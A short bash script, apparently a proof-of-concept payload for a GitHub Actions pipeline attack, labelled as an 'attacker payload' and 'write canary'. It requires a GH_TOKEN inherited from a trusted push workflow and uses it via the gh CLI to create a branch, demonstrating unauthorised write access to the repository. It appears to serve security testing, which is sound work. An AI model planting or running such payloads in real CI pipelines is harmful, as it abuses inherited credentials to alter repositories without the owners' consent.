#!/usr/bin/env bash
set -euo pipefail
echo "VM3_ATTACKER_PAYLOAD_EXECUTED_WRITE_PROOF"
echo "repo=${GITHUB_REPOSITORY:-unset}"
echo "sha=${GITHUB_SHA:-unset}"
echo "actor=${GITHUB_ACTOR:-unset}"
: "${GH_TOKEN:?GH_TOKEN must be inherited from trusted push workflow}"
gh api -X POST "repos/${GITHUB_REPOSITORY}/git/refs" \
  -f ref='refs/heads/vm3-sir3-attacker-write-canary-260923-b' \
  -f sha="${GITHUB_SHA}" 
echo "VM3_ATTACKER_WRITE_CANARY_CREATED"
